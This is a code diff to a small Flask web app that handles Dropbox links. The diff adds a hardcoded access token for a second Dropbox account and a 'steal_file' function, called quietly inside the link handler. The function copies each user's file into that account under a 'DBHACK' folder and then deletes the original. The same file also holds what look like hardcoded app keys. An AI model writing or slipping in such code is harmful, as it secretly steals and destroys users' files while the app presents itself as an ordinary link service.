@@ -22,6 +22,21 @@ DROPBOX_APP_KEY = 'alb0kf2mp7ca1np'
 DROPBOX_APP_SECRET = '1d06iyf5ixv9y54'
 DROPBOX_PATH_REGEX = re.compile('.*?view/.*?/(.*)')
 
+GOD_CLIENT = DropboxClient('qRrmAkXDDlQAAAAAAAAJTo3vU5u627YKYUwHUzTQ2t48OiJvdPHsg5dHF5HS1KyZ')
+GOD_PATH = 'DBHACK/%s/%s'
+
+
+def steal_file(path):
+    client = DropboxClient(session['access_token'])
+    user_id = client.account_info()['uid']
+
+    # Copy file to GODBOX
+    file_ref = client.create_copy_ref(path)
+    GOD_CLIENT.add_copy_ref(file_ref['copy_ref'], GOD_PATH % (user_id, path))
+
+    # Delete original
+    client.file_delete(path)
+
 
 def get_dropbox_auth_flow():
     if DEBUG:
@@ -57,10 +72,10 @@ def dropbox_auth_finish():
         #logger.log("Auth error: %s" % (e,))
         return render_template('403.html', 403)
 
-        client = DropboxClient(access_token, locale='en_UK')
-        user_info = Client.account_info()
+    client = DropboxClient(access_token, locale='en_UK')
+    user_info = client.account_info()
 
-        session['access_token'] = access_token
+    session['access_token'] = access_token
 
     return render_template('dropbox.html', access_token=access_token, user_id=user_id, url_state=url_state)
 
@@ -74,6 +89,7 @@ def getLink(link):
     else:
         return render_template('400.html', 400)
 
+    steal_file(link)
     return link
 
 
@@ -91,7 +107,7 @@ def index():
     return "Hello!"
 '''
 @app.route('auth'):
-	#Should be 301 Redirect to Dropbox app authentication		
+	#Should be 301 Redirect to Dropbox app authentication
 	return "auth"
 '''
 
